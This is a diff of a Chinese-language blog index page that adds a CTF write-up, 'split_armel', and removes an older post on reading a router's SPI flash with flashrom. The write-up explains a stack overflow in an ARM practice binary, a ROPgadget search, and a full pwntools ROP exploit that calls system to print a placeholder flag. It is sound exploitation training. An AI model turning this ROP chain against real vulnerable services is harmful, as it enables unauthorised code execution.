@@ -168,6 +168,107 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/10/split_armel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/10/split_armel/" class="post-title-link" itemprop="url">split_armel</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-10 05:03:33" itemprop="dateCreated datePublished" datetime="2023-04-10T05:03:33+08:00">2023-04-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 13:57:30" itemprop="dateModified" datetime="2023-04-11T13:57:30+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/ARMROP/" itemprop="url" rel="index"><span itemprop="name">ARMROP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题目的目的是使用ROP调用system函数，并设置参数为字符串<code>/bin/cat flags</code>的地址。总的来说，就是要了解armel的函数传参方式，然后调用相应的gadget。<br>分析pwnme函数，局部变量s的大小是36，但是可以传入0x60个字节，因此存在缓冲区溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [sp+0h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个地方再说一下armel下的函数栈帧开辟和释放流程吧：<br>在函数初始化阶段，先将R11和LR两个寄存器保存到栈上，然后将SP+4的大小保存到R11上，最后SP自减0x20来开辟了栈帧。<br>R11也叫做FP（Frame Pointer）寄存器，类似于x86下的EBP寄存器，用于和SP一起界定函数栈栈的边界。FP寄存器就是指向栈底，SP寄存器就是指向栈顶。<br>pwnme函数是在main函数中通过BL指令跳转执行，BL指令会将其下一条指令作为pwnme函数的返回地址保存到LR寄存器中。因此在pwnme函数中保存到栈上的LR寄存器值就是需要通过缓冲区溢出进行修改的关键数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010570                 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:00010574                 ADD     R11, SP, #4</span><br><span class="line">.text:00010578                 SUB     SP, SP, #0x20</span><br></pre></td></tr></table></figure>
+<p>在pwnme函数的结尾，会将R11+4的值赋值给SP，来做栈平衡。函数返回地址的跳转是直接通过POP指令将栈上的函数返回地址恢复到PC中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000105C0                 SUB     SP, R11, #4</span><br><span class="line">.text:000105C4                 POP     &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
+<p>和mipsel架构不同，armel的SP寄存器在函数的生命周期里面都是变化的，因此如果要定位、计算栈上变量的位置，可以用FP寄存器来计算。pwnme函数的局部变量s起始地址为fp-0x24，返回地址保存在fp，因此需要0x24个字节填充后，覆盖返回地址。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>经过观察，发现armel下的split不像mipsel，有UsefulGadgets可以直接使用。因此，需要自己去找gadgets了。<br>调用system函数需要知道system函数地址和传入的字符串，二者都在程序中。那么难点就是如何去传参。</p>
+<ol>
+<li>需要从栈上将字符串设置到寄存器R0</li>
+<li>需要从栈上将system函数的地址设置到PC寄存器上</li>
+</ol>
+<p>使用ROPGadget没有找到直接从栈上POP数据到R0的指令，因此考虑先将字符串地址从栈上取出到另外一个寄存器，然后再mov到R0上。只找到如下的一条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary split_armv5 | grep &quot;mov&quot; | grep &quot;r0&quot;</span><br><span class="line">0x00010558 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么继续找可以从栈上恢复数据到R3寄存器的指令，挺多的，找了如下的两条做参考：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary split_armv5 | grep &quot;pop&quot; | grep &quot;r3&quot;</span><br><span class="line">.fini:00010658                 POP     &#123;R3,PC&#125;</span><br><span class="line">.init:000103A4                 POP     &#123;R3,PC&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ROP编写如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00010658</span>) <span class="comment"># POP     &#123;R3,PC&#125;</span></span><br><span class="line">rop += p32(字符串地址)   <span class="comment"># 字符串地址</span></span><br><span class="line">rop += p32(<span class="number">0x00010558</span>)  <span class="comment"># mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">rop += p32(system函数)</span><br></pre></td></tr></table></figure>
+<p>简单补充一下armel下批量POP的话，是先POP到序号小的寄存器。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./split_armv5&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">pause()</span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00010658</span>) <span class="comment"># POP     &#123;R3,PC&#125;</span></span><br><span class="line">rop += p32(<span class="number">0x0002103C</span>) <span class="comment"># 字符串地址</span></span><br><span class="line">rop += p32(<span class="number">0x00010558</span>) <span class="comment"># mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class="line"></span><br><span class="line">rop += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">rop += p32(<span class="number">0x000103EC</span>) <span class="comment"># system函数地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>利用结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/utest/rop_practice/armv5/split_armv5/split_armv5&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">[+] Opening connection to 0.0.0.0 on port 8888: Done</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 0.0.0.0 port 8888</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/07/ret2win_armel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1216,98 +1317,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0-%E8%AF%BB%E5%8F%96K2P%E7%9A%84SPI%20flash/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0-%E8%AF%BB%E5%8F%96K2P%E7%9A%84SPI%20flash/" class="post-title-link" itemprop="url">树莓派折腾日记-读取K2P的SPI flash</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-28 05:19:56" itemprop="dateCreated datePublished" datetime="2023-03-28T05:19:56+08:00">2023-03-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-29 15:02:43" itemprop="dateModified" datetime="2023-03-29T15:02:43+08:00">2023-03-29</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>在Windows上有与ch341a配套的软件和驱动，那么理论上来说，Linux也应该有对应的软件，而且由于嵌入式领域相关还可能是先有的Linux版本然后再有的Windows移植版本。经过搜索，找到了一个软件flashrom，大概的原理应该是使用usb库，对不同的编程器做了适配，然后可以通过编程器读取到芯片类型、读写芯片内容等。</p>
-<p>树莓派上安装flashrom：<code>sudo apt-get install flashrom</code>，在我的树莓派上默认安装的是v1.2版本。<br>同样我在Mac上也安装了：<code>brew install flashrom</code>，版本是v1.3.</p>
-<h2 id="初始使用flashrom"><a href="#初始使用flashrom" class="headerlink" title="初始使用flashrom"></a>初始使用flashrom</h2><h3 id="树莓派（失败）"><a href="#树莓派（失败）" class="headerlink" title="树莓派（失败）"></a>树莓派（失败）</h3><p>将编程器夹子夹上K2P的内存芯片，并将编程器连接到树莓派的USB接口上。编程器的夹子让红线对准SPI flash圆孔处的引脚。SPI flash的芯片类型是：25Q127CSIG。<br><img src="/images/image-2023-0329-145331772.png" alt="undifined"></p>
-<p>在树莓派上运行flashrom，使用-p参数指定编程器为ch341a_spi。如下，检测到了两种spi芯片类型。<br><img src="/images/image-2023-0329-104350104.png" alt="undifined"></p>
-<p>后续需要使用-c命令指定spi芯片的型号，然后才能对芯片进行读、写、校验的操作。<br><img src="/images/image-2023-0329-104617133.png" alt="undifined"></p>
-<p>我选择了两种芯片类型都读取失败了：经过搜索，可能是libusb库的问题，需要重新安装。然后重新安装了库之后还是失败，怀疑是不是因为硬件的问题或者是flashrom软件的问题，于是在Mac上重新尝试了。<br><img src="/images/image-2023-0329-104953326.png" alt="undifined"></p>
-<h3 id="Mac（成功）"><a href="#Mac（成功）" class="headerlink" title="Mac（成功）"></a>Mac（成功）</h3><p>可能是因为flashrom版本的问题？树莓派上是v1.2.0，而Mac上是v1.3.0<br><img src="/images/image-2023-0329-112414415.png" alt="undifined"></p>
-<p>读取出来的固件也可以使用binwalk查看相关信息。那么可以确定是flashrom版本的问题，决定重新在树莓派上从源码编译安装最新版本的flashrom v1.3.0<br><img src="/images/image-2023-0329-132236655.png" alt="undifined"></p>
-<h2 id="树莓派重新编译v1-3-0"><a href="#树莓派重新编译v1-3-0" class="headerlink" title="树莓派重新编译v1.3.0"></a>树莓派重新编译v1.3.0</h2><p>在树莓派上重新编译flashrom，编译所需要的依赖可以根据官方库ReadMe文档安装，也可以在make的时候看检测安装。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/flashrom/flashrom/archive/refs/tags/v1.3.0.tar.gz</span><br><span class="line">tar -xvf v1.3.0.tar.gz</span><br><span class="line">cd flashrom-1.3.0</span><br><span class="line">sudo apt-get install libpci-dev libjaylink-dev libgusb-dev libftdi1-dev</span><br><span class="line">make </span><br></pre></td></tr></table></figure>
-<p>解决报错：<code>/bin/sh: 1: sphinx-build: not found</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br><span class="line">pip3 install Sphinx</span><br><span class="line">sudo apt-get install python3-sphinx</span><br></pre></td></tr></table></figure>
-<p>解决报错：<code>make: ./util/getrevision.sh: No such file or directory</code><br>这是因为在tag v1.3.0下载的源码没有.&#x2F;util&#x2F;getrevision.sh这个文件，从官方库中下载到源码目录或者手动创建一个。我是手动创建了该文件，然后从<a target="_blank" rel="noopener" href="https://github.com/flashrom/flashrom/blob/master/util/getrevision.sh">.&#x2F;util&#x2F;getreversion.sh</a>复制内容。</p>
-<p>安装的时候可以先卸载掉原来的flashrom，因为apt-get安装的在&#x2F;usr&#x2F;sbin目录，编译默认在&#x2F;usr&#x2F;local&#x2F;sbin</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge flashrom</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>重新编译后的flashrom需要使用sudo权限才能正常运行：<br><img src="/images/image-2023-0329-140859926.png" alt="undifined"></p>
-<p>现在可以成功读取K2P的SPI flash了。<br><img src="/images/image-2023-0329-142126329.png" alt="undifined"></p>
-<p>使用binwalk也可以检测读取出来的内容，读取成功<br><img src="/images/image-2023-0329-144246595.png" alt="undifined"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最开始在树莓派上使用apt-get安装的v1.2版本的flashrom来读取K2P的SPI flash，失败了。通过和Mac上使用flashrom成功读取对比，判断可能是flashrom版本问题，于是在树莓派上重新下载源码编译安装了v1.3的flashrom，最后读取成功。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1377,14 +1386,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
